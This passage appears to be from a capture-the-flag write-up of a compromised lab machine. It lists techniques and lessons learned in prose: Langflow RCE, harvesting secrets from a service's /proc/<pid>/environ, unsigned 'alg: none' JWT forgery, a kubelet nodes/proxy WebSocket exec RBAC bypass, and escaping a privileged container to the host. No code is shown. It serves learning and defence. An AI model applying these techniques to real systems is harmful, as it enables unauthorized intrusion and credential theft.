  analysis and applicability triage (confirmed present but unreachable
  pre-auth on this target)
- Secret recovery from a systemd service's process environment
  (`/proc/<pid>/environ`)
- Credential-reuse pivoting from an app-level superuser account to an SSH
  login
- `alg: none` unsecured-JWT forgery against a self-disclosed
  `supported_algorithms` banner
- Recovering an unauthenticated RCE's actual calling convention by reading
  the vulnerable service's own recovered source, rather than blind
  trial-and-error against assumed handler names
- Enumerating a Kubernetes ServiceAccount's real RBAC grant with
  `SelfSubjectRulesReview` rather than inferring it from behavior alone
- Abusing `get nodes/proxy` to read the full kubelet `PodList` and discover
  a misconfigured privileged DaemonSet pod
- Bypassing a kubelet RBAC restriction on `create nodes/proxy` (blocking
  SPDY-based `kubectl exec`) via the GET-upgraded WebSocket exec transport,
  which the Node authorizer's HTTP-method-to-verb mapping conflates with the
  already-granted `get` verb
- Hand-rolling a minimal stdlib-only WebSocket client to complete a kubelet
  exec handshake with no external tooling available
- Escaping a privileged, `hostPID: true` container to the real host via
  `/proc/1/root`

## Lessons Learned

- **A wildcard SAN certificate on a single externally-visible service is a
  standing invitation to fuzz vhosts**, and the content on the "obvious"
  domain can hand you the real target's exact address (a flow UUID, in
  this case) instead of making you guess it.
- **An endpoint whose entire documented purpose is "run caller-supplied
  data unauthenticated" deserves scrutiny of every field the caller
  controls, not just the ones an app's UI normally exposes.** Langflow's
  `build_public_tmp` was *designed* to accept unauthenticated flow data for
  a legitimately public flow — the bug wasn't that it accepts unauthenticated
  input, it's that the server-side component resolver trusts a metadata
  field the client can simply omit, rather than re-deriving it itself from
  something it actually controls.
- **A version-matched, source-confirmed CVE can still be legitimately
  unreachable on a specific deployment.** Confirming the vulnerable code
  exists is necessary but not sufficient — the actual precondition chain
  (here, `LANGFLOW_AUTO_LOGIN` defaulting true) has to be independently
  verified against the live target, not assumed from the advisory's
  description of a "typical" install.
- **A systemd service's environment is a first-class credential-recovery
  target the instant you have any code-execution foothold as that
  service's own user** — `/proc/<pid>/environ` needs no special privilege
  beyond matching the process owner.
- **A JWT service that self-advertises its supported algorithms in an
  unauthenticated status/version endpoint is handing you its own attack
  surface for free** — treat `"none"` appearing in any such list as a
  direct, immediately-testable signal, not something to infer from
  behavior first.
- **An RBAC grant should be evaluated by what it actually authorizes at the
  wire-protocol level, not by what its name suggests it's for.**
  `nodes/proxy` reads like infrastructure-metadata plumbing; in practice it
  gates the entire kubelet HTTPS surface, and a verb-inference scheme based
  on HTTP method (rather than on what the specific endpoint does) is a
  structural gap that a `get`-only grant can walk straight through via any
  endpoint whose legitimate protocol happens to start with a GET.
  `SelfSubjectRulesReview` is the right way to establish a token's real
  grant set with certainty — infer nothing from a Role's name or from
  partial behavioral testing when the API can just tell you directly.
- **A Helm chart's own well-known risky defaults (`node-exporter`'s
  `privileged`+`hostPID`+host-root-mount here) are worth checking on any
  box running a monitoring/observability stack**, independent of whatever
  specific RBAC bug is used to reach the pod that has them — the default
  itself is the payload once anything can exec inside it.
- **Read a vulnerable service's own recovered source before continuing to
  guess at its behavior.** Several plausible-looking invocation conventions
  were tried against the MCP tool-execution primitive and all failed
  silently; the actual mechanism was simpler and stranger than any of the
  guesses (no function-call convention at all, just a raw script run with
  stdout captured) and was only knowable for certain once the source was
  pulled through the same RCE primitive.

---

*Generalized, reusable notes extracted from this box:*
[[langflow-flow-metadata-module-strip-rce]],
[[jwt-algorithm-confusion-and-header-injection]],
[[kubelet-nodes-proxy-websocket-exec-rbac-bypass]]
